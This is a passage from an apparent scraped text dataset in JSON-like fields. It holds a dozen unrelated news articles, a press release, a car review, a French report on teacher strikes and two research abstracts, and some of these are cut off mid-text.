spoke on the condition of anonymity to describe a private event. Guests were told they could order off the menu, and they would pay their own bills. The dinner is not a political fundraiser; the person said it appeared Trump simply \u201cwanted dinner companions.\u201d \nIn September, the five-member city council approved an amended development agreement between Trump\u2019s company and the city, allowing the Trump family to advance its plans for the new lots. \nTwo members of the city council, Mayor Jerry V. Duhovic and Councilman Eric Alegria, recused themselves from the vote because they live within 500 feet of the property. It passed 3-0. \nThe club is otherwise closed to visitors today, according to its website. The city has closed hiking trails and parks nearby. The Federal Aviation Administration has also closed the airspace around the club from 6:30 p.m. to 9:15 p.m. Pacific time \u2014 a window that coincides with the blank spot in Trump\u2019s official White House schedule. \n\u201cTemporary flight restrictions for VIP Movement,\u201d the FAA notice said. \nOn Friday, neither the White House nor the Trump Organization would say if Trump planned to visit the club, called Trump National Golf Club, Los Angeles. \nEric Trump, who is helping to run the company during his father\u2019s presidency, also declined to answer questions about the course, or his father\u2019s trip. \nTrump owns 12 U.S. golf courses. But, as president, he has only spent significant time at four of them \u2014 two in Florida near his \u201cwinter White House\u201d at Mar-a-Lago, one in Virginia near the actual White House, and one in Bedminster, N.J., that he uses as a summer retreat. \nTrump treats those clubs as second homes, full of high-paying club members he knows personally. \nThe Los Angeles course is not like those. \nIt is a public course, which means it offers no memberships and no ready locker-room crowd of Trump friends. \nIt is Trump\u2019s only West Coast course, which means he has visited only rarely in the past. And, unlike other courses, it is a place where Trump is also in the real estate business \u2014 developing and selling new home lots near the fairways. \nTrump bought the Los Angeles course in 2002 for $27 million, from a previous owner who had gone bankrupt after a landslide pulled part of the 18th hole into the Pacific Ocean. Trump took out a $20 million loan, which he has already paid off. \nAt the time, Trump promised \u201ca course to rival Pebble Beach.\u201d He shored up the land and reconfigured it into a course that is beautiful to look at, but notoriously hard to play, since it requires hitting narrow fairways in the teeth of strong ocean breezes. \n\u201cMost people don\u2019t play it regularly. It\u2019s a one-off kind of golf experience,\u201d for tourists or golfers looking for a splurge,\u201d Gene Krekorian, a California golf-course appraiser who has assessed this course, told The Washington Post in 2017. \nKrekorian said the club, which is open to the public, was too expensive: Prices used to reach $300 per golfer; this week the fees went up to $195. The closest nearby public course \u2014 with similar views \u2014 co sts $30 per round . \n\u201cIt\u2019s a spectacular facility, but it\u2019s way overpriced,\u201d Krekorian said in 2017. \nThis course\u2019s business seemed to suffer after Trump got into politics in 2015. \nSports teams and charities moved their charity-golf tournaments. The club\u2019s revenue from golf dropped and stayed down: last year\u2019s receipts were 10 percent lower than the figure from 2014, adjusting for inflation. \nThe club found other ways to make money. It rented itself out as a Hollywood set: It played a U.S. Embassy on \u201cCriminal Minds\u201d and hosted a wedding for \u201cModern Family.\u201d But that business, too, dropped off after Trump got into politics. \nThe club has also made money by selling land, much of it with beautiful ocean views. \nIn the last few years, that has brought in far more money than golf. \nFirst, Trump got permission to sell 36 home lots on the west side of the course. He has now sold 33 of them, bringing in $84 million. \nIn most cases, Trump minimized his costs by selling the lots vacant. Developers built homes on the empty lots and often sold them for $2 million or $3 million more than they paid Trump. \nNow, Trump\u2019s company is facing a decision about how to develop the other side of the golf course, where the city recently granted approvals for those 23 new home lots. \nUntil this week, the Trump Organization was delinquent on $36,000 worth of property taxes at this course. The delinquent taxes were for a section of the course that includes all 23 of the new proposed home lots. The company paid after The Post pointed out the unpaid bills. \nSeung Min Kim contributed to this report.",

      "text": "[Image: courtesy of NASA/JPL-Caltech] \nScientific history is about to be made. \nBlack holes, those so-called event horizons from which even light cannot escape and all known laws of physics break down, have long been fodder for the imaginations of science fiction writers and Hollywood producers. (Seriously, just Google \u201cblack hole movies\u201d to see the list). Black holes were predicted by both Newton\u2019s and Einstein\u2019s theories of gravity, and astrophysicists have studied mysterious objects in the night skies that they believe are consistent with black holes. They\u2019ve been able to theorize and simulate the elusive objects in the lab. \nHowever, no one had been able to capture on film one of those dark spots from which nothing can escape\u2014until now. \nOn Wednesday, April 10, at 9 a.m. EDT , scientists working with the Event Horizon Telescope (EHT) project and the National Science Foundation (NSF) will hold a press conference to unveil the first-ever image of a black hole. It\u2019s a huge scientific breakthrough, and in a move that would make both Hollywood and science fiction writers proud, as the press briefing in the U.S. takes place, press conferences will be held simultaneously in Brussels, Santiago, Shanghai, Taipei, and Tokyo. \nInterested parties can watch the Event Horizon Telescope collaboration release the first of its kind image of the black hole via a live stream that will share the long-awaited breakthrough with an eager public. \nVIDEO",

      "title": "NBA trade rumors: Pelicans keeping Jrue Holiday will have league-wide impact",
      "text": "New Pelicans vice president of basketball operations David Griffin was introduced this week and laid out some points that have league-wide ramifications. And since it's a Good Friday, we figure it is time for a Good Rumor-rama, and Griffin's Pelicans are the subject. \nFirst, Griffin said that the team would meet with star forward Anthony Davis , whose January trade request torpedoed the entire season in New Orleans and shredded Davis' relationship with the team and city. \nSecond, he stated that coach Alvin Gentry would be sticking around for next season, despite his 145-183 record in four seasons. Griffin and Gentry worked together in Phoenix when Gentry was an assistant and head coach from 2003 until Griffin moved on in 2010. \nThird, he called point guard Jrue Holiday, who averaged 21.2 points, 7.7 assists and 5.0 rebounds this season, a franchise building block. \nOFFSEASON PREVIEWS: \nLakers | Knicks | Bulls | Pelicans | Mavericks \nAnd it's that last one that could, in the end, have the biggest impact league-wide. Because while Gentry coming back is not a shock and the Davis situation is unlikely to be much changed by a face-to-face meeting, if the Pelicans don't trade Holiday, it will set up the team for an attempt at a fast turnaround rather than a long, slogging rebuild. \nIt will also frustrate teams looking for a versatile point guard in his prime, hoping that Holiday would be on the block. League sources say the Suns are considered a top contender should Holiday be made available, the ideal fit for a team badly in need of a multifaceted veteran at the point. \nBut Orlando would have interest, too, as would Chicago - though Holiday's brother, Justin, did not have a sterling experience with the Bulls this season before being traded to the Grizzlies. \nIf Griffin is intent on keeping Holiday, it is a signal that he will look to bring a quick turnaround for the Pelicans. That could be a benefit to the two teams most closely linked to Davis once his trade demand went public - the Celtics and Lakers. \nThere had been a sense that the Pelicans would entertain dealing away Davis to the team that won the top overall pick in next month's draft lottery, with Zion Williamson as the prize. But that would likely be paired with a deal sending Holiday out so that New Orleans could completely rebuild. \nIf the Pels don't make a play for Williamson, then the packages that could be offered by Boston figure to be the most attractive. The Celtics could build a deal around forward Jayson Tatum, their three first-round picks this year (Nos. 14, 20 and 22) and the Memphis pick they own, which is likely to be available unprotected in 2021, unless it slips to No. 9 in this year's lottery. \nBoston also has Jaylen Brown, who would welcome a bigger role elsewhere, on hand. But the Celtics' move for Davis could be contingent on their confidence that point guard Kyrie Irving stays in free agency. \nThe Lakers, after offering a trove of picks and players at the deadline for Davis, will attempt to get back in the mix. Their deal would be built around Kyle Kuzma and Brandon Ingram, with a potential third team taking on Lonzo Ball and offering the Pelicans a draft pick. \nThere isn't much optimism that Griffin can persuade Davis to stay in New Orleans, and surely, he knows that. But meeting with Davis and his agent, Rich Paul, is more about mending fences and restoring the Pelicans' reputation, especially among agents. \nPaul represents LeBron James, who led the Cavaliers' teams that went to four straight Finals, with Griffin as the general manager for three of them (2014-17). Griffin cited his relationship with Paul as a selling point in keeping Davis, a far cry from the acrimonious relationship that developed between Paul and Dell Demps, Griffin's predecessor. \n\"Griff is a guy who, when you call him, he calls you back,\" one prominent agent told SN. \"He'll listen to whatever your issue is, whatever your player's issue is, no matter how small. So he has that reputation, and that's not something that New Orleans has had over the years. \n\"I think he wants to get that team back to that basic thing, just showing how you treat players day in and day out. That's what you want a team and an organization to be.\" \nGriffin, it seems, wants the Pelicans to have a renewed reputation in the league after a disaster of a season. It'll begin with patching up things with Davis before trading him away. \nBut it could quickly involve getting the team to be competitive again with young players and draft picks coming in, and Holiday as the centerpiece.",

      "title": "Some Forgotten Details About the Ford Raptor We Haven't Talked About Yet",
      "text": "Truck Yeah The trucks are good! \nThe Ford Raptor is one of those vehicles that\u2019s been pretty extensively covered on our fine internet-newsletter here. Over the past couple years, we\u2019ve talked about how it\u2019s a thirsty one-trick pony that\u2019s also shockingly good on twisty roads and is now strong as hell but is, really, just too damn big . All of these things are true. So, when I was delivered a Raptor to test in my little college town, there wasn\u2019t a hell of a lot left to do with it, really. Instead, I\u2019m just going to focus on some small, forgotten details you still have a right to know about. \nFirst, I should mention that I absolutely agree with Raph. The Raptor is too damn big. Maybe not in deserts or on the relatively traffic-free Utopia Planitia area of Mars, but in my little neighborhood, in my little town, with my stupid little body, yes, it\u2019s too fucking big. \nThis is me, standing next to the Raptor. I\u2019m short, which means that the top of the bed is right about cheekbone-height: \nEven if you, like most of the universe, are taller than me, this is still an awkward height for loading anything into the truck, which makes it less useful as a truck. I get that it\u2019s an off-roading beast and there\u2019s a look and all that, but, come on, most of these are still just driven on roads, and their size makes them a pain in the ass. \nMy Pao is only as long as the Raptor is before the entire bed. And the bed is almost as high as the whole car. The Pao is small, sure, but this truck is big. \nOkay, with that bit of obviousness out of the way, let\u2019s hit some of the few details about the Raptor we\u2019ve yet to discuss: \nIt\u2019s the only car on the market with an external badge for Blindspot Radar \nI suppose if your buying criteria involves that you really want to show off that your car is capable of checking its blind spots on its own, this is pretty much your only choice. \nAlso, the fact that the badge is on a false taillight lens is notable, too; the only other false taillight lens that hides something else that I can think of on a currently-available car is probably the Telsa\u2019s charging port hidden behind a rear side marker light? Though that light actually works, or is a reflector. Anyway, if you\u2019re into fake taillight lenses as well, check out the Raptor. \nIt has a bunch of funny little marker lights because, legally, it has to \nI actually really like all the little marker lights the Raptor has; it has three on the grille, and little amber ones on each front fender corner, with red ones at the rear. \nAs our own Andrew Collins pointed out on the Chevy Silverado, once a vehicle hits a certain size, federal law mandates that it must have certain extra lights. In the case of the Raptor, since it\u2019s more than 80 inches wide, that means Uncle Sucker mandates it must be equipped with three amber \u201cidentification lamps\u201d which Ford sticks on the grille there, and the little corner lights are \u201cclearance lamps\u201d so you can see how freaking wide this beast is. \nIt has the biggest, flattest rear-seat legroom area of any vehicle on the market \nOkay, I haven\u2019t backed this up with detailed measurements, but I\u2019m still pretty confident this is true. If your goal is to own a vehicle with the largest, flattest area for your rear seat passengers, legs, feet, hooves, talons, or whatever, then the Raptor is for you. \nThe rear seats also have a very good center console with HVAC vents and a remarkably comprehensive selection of power ports: two USBs, one 12V cigarette lighter-style outlet , and an AC-inverter-driven 110V regular three-prong wall outlet. \nSpeaking of power outlets, are these USB symbols upside-down? \nOn the Raptor\u2019s front pair of USB ports in the center console area, the USB symbols are printed like you see above there. Are they upside-down? \nI feel like I normally see the little USB icon with the arrow pointing up, like this one to the right here: \nDoes the USB symbol have a top and bottom? I know the stupid connectors do, because I manage to get it wrong 99% of the time I try to plug one in. \nMaybe Ford is trying to send some message here. Do they think USB is demonic? Down with USB? Does the ball part indicate where the flat plastic bit with the contacts is in relation to the socket? Is that something everyone secretly knows? \nThis little power sliding window to the bed is great and I believe is Ford\u2019s tacit approval of people riding in the bed, which is a wonderful thing \nI know that riding in the bed of a moving truck is dangerous and you shouldn\u2019t do it and it\u2019s terrible and going to kill us all, but, at the same time, I also believe it\u2019s one of the great simple joys in life and if you\u2019ve lived a life where you\u2019ve never ridden in the back of an open pickup bed on a summer afternoon, preferably after you\u2019ve been swimming in a quarry or something, then your life is sorely lacking. \nI think, secretly, Ford believes this, too, so they added that little sliding window to facilitate communication with your pals in the bed. They can\u2019t ever admit this, but I\u2019m going to believe it\u2019s true. \nThe Raptor\u2019s large door window sill areas and huge mirrors provide birds with an excellent place to go nuts on their reflection and shit with excitement \nIf you have a Raptor, you can expect that the areas by your side mirrors will always be spattered in bird shit, because the combination of a big mirror and plenty of room to stand and shit is just too irresistible for birds. \nYou\u2019ve seen how excited birds get when they see their reflections in car mirrors, right? \nThe Raptor\u2019s setup is pretty much the gold standard for standing and freaking out at your reflection in the bird community. \nAlso, shitting. \nI think we\u2019ve said all we can about the Raptor now. You can all relax.",

      "text": "Decoupling of energy stocks from oil prices burns operators \nBy Kevin Crowley on 12/22/2019 \n \n \n \nHOUSTON (Bloomberg) - This year has been one of moderate gains for the price of oil, but it has been bleak for producers. \nWest Texas Intermediate crude is heading for an annual increase of more than 30%, but the best performance among the global oil majors has been Chevron Corp., which has posted a gain of just 10%. The S&P 500 Energy Index has almost entirely decoupled from oil in 2019 and is on course to underperform crude by the most since the shale revolution began a decade ago. \nThe malaise is largely attributable to the gush of supply from quick-to-drill shale wells. The shale revolution has made the U.S. the world\u2019s biggest producer of oil and natural gas. In 2019 it became a net exporter of crude for the first full month in at least 70 years. Production was at a record 12.9 MMbpd at the end of November, more than Iraq, Iran, Kuwait and United Arab Emirates combined. \nBut independent U.S. oil companies have become a victim of their own success, boosting production via debt-fueled drilling campaigns at the expense of their own shareholders, who have waited in vain for sustainable free cash flow. The message from investors to producers in 2020 is a simple one: Stop spending our money. \nShareholder apathy has seen energy slump to just 4.2% of the overall market value of S&P 500 Index at the end of November, a record low. Even the majors, with operations spread around the world, aren\u2019t immune. Exxon Mobil Corp. dropped out of the top 10 companies in the S&P 500 companies for the first time. \n\u201cAbsolutely capital discipline is the number one priority, said Jeff Wyll, senior energy analyst at Neuberger Berman Group LLC, which has about $333 billion under management. \u201cDeliver on your promises, don\u2019t raise capital expenditures, stay disciplined. It\u2019s that simple.\u201d \nIn the broader U.S. energy space, the best performers in 2019 have been pipeline operators, refiners, and companies with big assets outside the shale sector. The worst have been shale-heavy producers, especially those with high levels of debt and spending, or more assets that are more gassy -- gas prices are down for a third year. \nEnergy Winners and Losers. With energy now such a small share of the broader market, many fund managers are unwilling to devote time to studying individual stocks, according to Jennifer Rowland, an analyst at Edward Jones & Co. Chevron is the go-to stock for energy exposure due to its large index weighting and commitment to financial discipline, she said. \n\u201cPick Chevron, maybe one other, and to heck with the rest of the space,\u201d she said, describing the mindset of energy investors in 2019. \nChevron distinguished itself this year by walking away from its attempt to buy Anadarko Petroleum Corp. rather than top a $37 billion bid from Occidental Petroleum Corp. It was a move unthinkable during the boom times for Big Oil: One of the world\u2019s largest companies allowing itself to be outbid by an independent only a fifth of its size. \nBut in an environment where investors prize capital discipline above all else, that decision has so far been vindicated. Chevron burnished its reputation for financial prudence, pocketed a $1 billion break-up fee and later boosted its share buyback plan by 25%. Occidental, meanwhile, has plunged to a record low and was forced to cut capital spending and sell assets to pare down the debt incurred buying Anadarko. \n\u201cThe consolidators so far have been punished by the market,\u201d Wyll said. \u201cChevron is seen as a leader on the capital discipline front right now.\u201d \nRelated News /// \nFROM THE ARCHIVE ///",

      "text": "As established democracies like India, Brazil, Hungary, the Philippines, and the United States fall deeper into authoritarian politics, pressure will only increase on news organizations who seek to safeguard democracy by providing truth to the public. \nOutlets like Rappler under Rodrigo Duterte, Intercept Brasil under Jair Bolsonaro, and Szabad Pecs under Viktor Orb\u00e1n must navigate a gauntlet of threats and attacks as autocratic leaders seek to control the narrative and suppress facts about what their administrations are doing. \nWe at The GroundTruth Project reported on a \u201c playbook \u201d that democratically elected but autocratically minded politicians all seem to be using. There are striking similarities in the tactics these leaders are using as they target the media, create scapegoats both foreign and domestic, rewrite history and ultimately, seek to erode the very concept of truth: a common set of facts that make constructive dialogue and debate possible. \nThe epithet \u201cfake news\u201d has spread like a virus, weaponized by strongmen around the world against all who would dare tell it like it is. Meanwhile, actually disingenuous information sweeps the globe, hardly held in check by amateur and professional fact-checkers despite their valiant efforts . \nA 2015 study found that even people who are knowledgeable about a subject are susceptible to false information that is frequently repeated. The researchers called this the \u201cillusory truth effect.\u201d And attacking the messenger seems to work too, sowing doubt in the minds of the public. \nAs veteran 60 Minutes journalist Lesley Stahl revealed , she sat with President Trump soon after his 2016 election victory and asked him why he attacks the press. She said Trump replied, \u201cYou know why I do it? I do it to discredit you all and demean you all, so that when you write negative stories about me, no one will believe you.\u201d \nIn the United States, the crisis in local news only compounds the challenge. As Margaret Sullivan argued in The Washington Post last month , the \u201cdeath knell for local newspapers\u201d is \u201cperilously close.\u201d \n\u201cOne of the worst parts about what has happened is that local news sources are relatively well-trusted,\u201d she wrote. \u201cIn an era of deep antipathy toward the media, that\u2019s no small thing. They still are one of the ways that many communities maintain a sense of unity and shared facts.\u201d \nBut disunity is what authoritarians and wannabe authoritarians depend on to divide and conquer. When the public is busy throwing stones at one another, there\u2019s less time to stop and take a careful look at the powerful men in glass houses. \nAnd when the free press is diminished, there are fewer journalists walk the halls of those houses and report back to the people. When the public distrusts the press, few believe the reporting anyway. When the press is captured by the state , as we see in countries like Russia, Turkey, India, Hungary, people may believe what is presented but it is propaganda concocted by corrupt leaders. \nA free and independent press remains one of the world\u2019s best defenses against tyranny. And in 2020, we\u2019re gonna need it. \nKevin Douglas Grant is the co-founder and executive editor of The GroundTruth Project and vice president of Report for America.",

      "text": "New Financing Will Accelerate Growth and Rapid Global Deployment of Company's Transformative Utility-Scale Energy Storage Technology \nEnergy Vault, the creator of renewable energy storage products that are transforming the world's approach to long duration, utility-scale energy storage, today announced it has completed a $110 million Series B funding round. The investment for the round was made by SoftBank Vision Fund (Vision Fund) in its first investment in energy storage technology. Energy Vault will use the funds to accelerate global deployment of its technology, which for the first time enables renewables to deliver baseload power for less than the cost of fossil fuels 24 hours a day. As part of the investment, Andreas Hansson, Partner for SoftBank Investment Advisers, will join the Energy Vault board of directors.\n \nThis press release features multimedia. View the full release here: https://www.businesswire.com/news/home/20190814005008/en/ \nEnergy Vault storage tower with PV and wind storage. (Photo: Business Wire) \nRenewables have struggled historically to fully replace fossil fuel power as a result of production unpredictability and intermittency from reliance on variable factors such as wind and sunlight. In the absence of more efficient and cost-effective storage, the amount of electricity that can be delivered to the grid from renewable energy sources, even though now widely affordable, has been limited.\n \nEnergy Vault's breakthrough technology was inspired by pumped hydro plants that rely on the power of gravity and the movement of water to store and discharge electricity. The company's solution is based on the same well-understood fundamentals of physics and mechanical engineering used in those plants, but replaces water with custom made composite bricks through an innovative use of low-cost materials and material science. The bricks, each weighing 35 metric tons, are combined with Energy Vault's proprietary system design and machine vision software to operate a newly designed crane. The software autonomously orchestrates the energy storage tower and electricity charge/discharge utilizing predictive intelligence and a unique stack of proprietary algorithms that account for a variety of factors, including energy supply and demand volatility, grid stability, weather elements and other variables. As a result, the Energy Vault tower can deliver all the benefits of a large scale pumped hydro storage system, but at a much lower levelized cost, higher roundtrip efficiency and without the requirement for specific land topography and negative environmental impacts.\n \nEnergy Vault has experienced significant growth since its launch in November 2018. In addition to the previously announced agreement with The Tata Power Company Limited, India's largest integrated power company, Energy Vault will be demonstrating the first 35MWh storage tower in the north of Italy in 2019. The company has also developed an extensive relationship with CEMEX (NYSE: CX) that includes a technology collaboration and development agreement with CEMEX Research Group AG (Switzerland) as well as an investment from CEMEX Ventures announced in May 2019. As a further measure of the unprecedented market demand and upcoming adoption of the technology, Energy Vault has agreements with customers on four continents.\n \n\"Energy Vault solves a long-standing and complex problem of how to store renewable energy at scale,\" said Akshay Naheta, Managing Partner for SoftBank Investment Advisers. \"The company's integration of proven technologies with 21 st century material science and machine vision software provides a solution that reshapes the unit economics of renewable energy while being restorative to the environment. Energy Vault is highly complementary to SoftBank's existing energy portfolio and we are pleased to further the company's global development.\"\n \n\"As we pursue our mission to enable renewable energy to replace fossil fuels 24 hours a day, we're thrilled to partner with SoftBank Vision Fund as we expand our global presence,\" said Robert Piconi, Chief Executive Officer and Co-Founder, Energy Vault. \"The Vision Fund shares our passion to combat climate change through innovation in energy storage technologies and, with its support as a strategic partner, Energy Vault is well positioned to meet the large and currently unmet demand for sustainable and economical energy storage worldwide.\"\n \nAbout Energy Vault \nEnergy Vault is the creator of renewable energy storage products that are transforming the world's approach to long duration, utility-scale energy storage. Applying conventional physics fundamentals of gravity and potential energy, the system combines an innovative crane design that lifts specially designed, massive concrete bricks with a proprietary, cloud-based software platform which orchestrates the storage and discharge of electricity. Utilizing 100 percent eco-friendly materials at unprecedented economics, Energy Vault is accelerating the shift to a fully renewable world.\n \nIn April 2019, Energy Vault was awarded Fast Company 's World Changing Idea Award, winning the Energy category. The company was created at Idealab Studio, the leading technology incubator founded by Bill Gross.\n \nFor more information about Energy Vault, please visit energyvault.com or @EnergyVaultInc \nView source version on businesswire.com: https://www.businesswire.com/news/home/20190814005008/en/ \nContacts: \nIsaac Steinmetz\n \nenergyvault@antennagroup.com \n+1.646.883.3655",

Le Syndicat national unitaire des instituteurs, professeurs des \u00e9coles et PEGC-F\u00e9d\u00e9ration syndicale unitaire (SNUipp-FSU), principal syndicat des professeurs des \u00e9coles, annonce, lui, 25 % de gr\u00e9vistes, avec de grosses disparit\u00e9s r\u00e9gionales : 70 % \u00e0 Paris, 50 % en r\u00e9gion parisienne, 40 % \u00e0 Toulouse et Nantes, etc. Le rectorat de Paris \u00e9voque, de son c\u00f4t\u00e9, 37 % de gr\u00e9vistes dans les \u00e9coles maternelles et \u00e9l\u00e9mentaires de la capitale. \nLe SNUipp-FSU pr\u00e9cise que le taux de gr\u00e9vistes n\u2019est pas \u00ab le seul thermom\u00e8tre de la mobilisation \u00bb , car celle-ci prend de multiples formes : Nuits des \u00e9coles, Journ\u00e9e \u00e9coles mortes, Carnaval \u00e0 Blanquer \u00e0 N\u00eemes, rassemblements, occupations d\u2019\u00e9coles par les parents d\u2019\u00e9l\u00e8ves, pique-nique revendicatif dans les Hautes-Alpes\u2026 \nD\u00e9fiance des enseignants \nLe projet de loi Blanquer suscite la d\u00e9fiance. Adopt\u00e9 en premi\u00e8re lecture le 19 f\u00e9vrier \u00e0 l\u2019Assembl\u00e9e, il doit encore passer au d\u00e9but de mai devant le S\u00e9nat, et les syndicats aimeraient le voir retoqu\u00e9 ou m\u00eame abrog\u00e9. En cause, plusieurs dispositions, notamment la cr\u00e9ation d\u2019 \u00ab \u00e9tablissements publics des savoirs fondamentaux \u00bb , dont l\u2019objectif sera de rassembler en une seule entit\u00e9 un coll\u00e8ge et une ou plusieurs \u00e9coles du m\u00eame secteur. \nDans les communes rurales qui, rentr\u00e9e apr\u00e8s rentr\u00e9e, voient leurs effectifs fondre, le projet a fait l\u2019effet d\u2019une bombe : on y lit la mise en p\u00e9ril des petites \u00e9coles de village. L\u2019inqui\u00e9tude est forte, aussi, parmi les directeurs d\u2019\u00e9cole, qui redoutent de \u00ab passer sous la coupe \u00bb des principaux de coll\u00e8ge, voire de dispara\u00eetre purement et simplement. \nArticle r\u00e9serv\u00e9 \u00e0 nos abonn\u00e9s Lire aussi \u00ab Loi Blanquer \u00bb : le bon \u00e9l\u00e8ve du gouvernement \u00e0 l\u2019\u00e9preuve de la rue \nLe passage de l\u2019instruction obligatoire de 6 \u00e0 3 ans fait \u00e9galement grincer des dents, car il oblige les municipalit\u00e9s \u00e0 financer la mesure pour les maternelles priv\u00e9es. \u00ab C\u2019est un cadeau estim\u00e9 \u00e0 150 millions d\u2019euros aux \u00e9coles priv\u00e9es que les municipalit\u00e9s vont devoir sortir de leurs poches d\u00e9j\u00e0 bien \u00e9corch\u00e9es. Et un financement qui risque de se faire en baissant le budget consacr\u00e9 aux \u00e9coles publiques \u00bb , expose le SNUipp-FSU. \nAvant la manifestation de samedi, Jean-Michel Blanquer a \u00e9crit aux enseignants une lettre de soutien, les pr\u00e9sentant comme \u00e0 \u00ab l\u2019avant-garde du progr\u00e8s social \u00bb . Mercredi, c\u2019est aux directeurs d\u2019\u00e9cole qu\u2019il a \u00e9crit, notamment pour apporter \u00ab toute garantie \u00bb sur le maintien de leurs fonctions. \nActions de d\u00e9sob\u00e9issance \n\u00ab Le ministre voit bien que la loi ne convient pas aux enseignants, qu\u2019elle ne correspond pas aux pr\u00e9occupations de l\u2019\u00e9cole \u00bb , d\u00e9clare Francette Popineau, secr\u00e9taire g\u00e9n\u00e9rale du SNUipp-FSU.

      "text": "1947 Union, NJ W2VPI QSL Card \nA QSL card is a written confirmation of either a two-way radio communication between two amateur radio stations or a one-way reception of a signal from an AM radio , FM radio , television or shortwave broadcasting station. It can also confirm the reception of a two-way radio communication by a third party listener. A typical QSL card is the same size and made from the same material as a typical postcard , and most are sent through the mail as such. \nQSL card derived its name from the Q code \"QSL\". A Q code message can stand for a statement or a question (when the code is followed by a question mark). In this case, 'QSL?' (note the question mark) means \"Do you confirm receipt of my transmission?\" while 'QSL' (without a question mark) means \"I confirm receipt of your transmission.\" \nDuring the early days of radio broadcasting, the ability for a radio set to receive distant signals was a source of pride for many consumers and hobbyists. Listeners would mail \"reception reports\" to radio broadcasting stations in hopes of getting a written letter to officially verify they had heard a distant station. As the volume of reception reports increased, stations took to sending post cards containing a brief form that acknowledged reception. Collecting these cards became popular with radio listeners in the 1920s and 1930s, and reception reports were often used by early broadcasters to gauge the effectiveness of their transmissions. \nThe concept of sending a post card to verify reception of a station (and later two-way contact between them) may have been independently invented several times. The earliest reference seems to be a card sent in 1916 from 8VX in Buffalo, New York to 3TQ in Philadelphia, Pennsylvania (in those days ITU prefixes were not used). The standardized card with callsign, frequency, date, etc. may have been developed in 1919 by C.D. Hoffman, 8UX, in Akron, Ohio . In Europe, W.E.F. \"Bill\" Corsham, 2UV, first used a QSL when operating from Harlesden , England in 1922.",

      "text": "Google\u2019s leadership team trusted Phil Harrison to head the search company\u2019s foray into games . As vice president in charge of Google Stadia , Harrison has to make sure that the company has put all the right things in place to make its cloud gaming platform a success. \nI\u2019m happy to report that Harrison will be one of our speakers at GamesBeat Summit 2019 , which will be held on April 23 and April 24 in Los Angeles at Two Bit Circus, the micro-amusement park with modern entertainment like virtual reality stations. After last week, Harrison is the person to talk to in the game industry, and we are delighted he will do that at our event. \nCheck out the agenda . Harrison is one of more than 80 speakers who will talk on the theme of \u201cBuilding gaming communities\u201d across two days. The code GBS19EXPERIENCE will unlock a 20 percent discount on your registration . \nHarrison\u2019s appointment and the authority Google\u2019s leaders have apparently given him is a clear sign that gaming has arrived and the biggest tech companies on earth are taking it seriously. Cloud gaming has been around for more than a decade, with disappointing results that have left many gamers skeptical. \nBut the infrastructure of the internet is different today, and graphics processing units (GPUs) are commonplace in data centers. Cloud gaming should be a solvable problem, and Google\u2019s Stadia is going to be the biggest test yet. \nRivals like Amazon, Electronic Arts, Microsoft, and Sony are likely to compete across games, much the way Apple is competing in movies and TV shows with the likes of Netflix, Disney, Amazon, and other Hollywood companies. \nHarrison\u2019s appearance at the Game Developers Conference in San Francisco last week was the starting gun for a new round of competition. But many questions are still open. Harrison will appear onstage with an interesting moderator, and their discussion will shed light on how this is going to be good for game creators of all kinds. And that\u2019s why we think GamesBeat Summit 2019 will be a can\u2019t-miss conference for the who\u2019s who of the game industry to gather and learn. \nAbove: Phil Harrison shows off the Google Stadia game controller at GDC 2019 last week. \nImage Credit: Google \nGoogle has a lot of skeptics. But Harrison is a dangerous man to run Google\u2019s business \u2014 at least dangerous to the competitors \u2014 because he brings game business credibility to a big company that has never had enough gamer DNA. \nHarrison joined Google in January 2018. Before that, he was serving as a tech investor and adviser at London Venture Partners and Alloy Platform Industries. He was also a key executive in Microsoft\u2019s Xbox business from 2012 to 2015. He was a board member at Atari and before that he served in a number of executive positions at Sony\u2019s PlayStation business over the course of 15 years. He was part of the original team that got the PlayStation off the ground in 1994. \nHis influence is far-reaching. Just yesterday, Geoff Keighley announced that Harrison will be a special adviser for The Game Awards , the once-a-year event that draws tens of millions of viewers in celebration of gaming. \nHarrison has always been an interesting figure in games. I remember one time we rode a bus together at the old Ziff Davis Gaming Summit and we talked about the then-novelty of the Blair Witch Project . I also recall George Haber of Gigapixel chasing down Harrison, who was then at Sony, in the halls of the Fairmont Hotel in San Jose, California, to pitch Harrison on a new graphics chip. Harrison turned to me and asked if this guy was for real. (Haber was for real, and he almost got his chip in the Xbox). \nOne of the consequences of Harrison\u2019s cred in gaming that goes so far back is that he has been able to hire a team of veterans, including Jade Raymond , former Ubisoft and Electronic Arts executive. \n\u201cI\u2019ve been really happy with the team I\u2019ve been building. More than half of my leadership team now comes from the game industry,\u201d Harrison said in our interview last week. \u201cWe have some very seasoned talent. We have some great new passionate thinkers. It\u2019s fun seeing the inside of Google that Sundar alluded to yesterday. There are a lot of passionate gamers who got into tech because of games. They work at Google. They\u2019re now able to bring their talents to a game platform. It\u2019s a win-win. It\u2019s not just about hiring people from outside of Google. It\u2019s also about finding those talents from inside.\u201d",

      "text": "Recent approaches to cross-lingual word embedding have generally been based on linear transformations between the sets of embedding vectors in the two languages. In this paper, we propose an approach that instead expresses the two monolingual embedding spaces as probability densities defined by a Gaussian mixture model, and matches the two densities using a method called normalizing flow. The method requires no explicit supervision, and can be learned with only a seed dictionary of words that have identical strings. We argue that this formulation has several intuitively attractive properties, particularly with the respect to improving robustness and generalization to mappings between difficult language pairs or word pairs. On a benchmark data set of bilingual lexicon induction and cross-lingual word similarity, our approach can achieve competitive or superior performance compared to state-of-the-art published results, with particularly strong results being found on etymologically distant and/or morphologically rich languages.",

This embodied cognition perspective also explains why music structures modulate kinetic and somatosensory perception. We leverage this aspect of cognition, by considering dance as a proxy for music perception, in a statistical computational model that learns semiotic correlations between music audio and dance video. We evaluate the ability of this model to effectively capture underlying semantics in a cross-modal retrieval task. Quantitative results, validated with statistical significance testing, strengthen the body of evidence for embodied cognition in music and show the model can recommend music audio for dance video queries and vice-versa.",

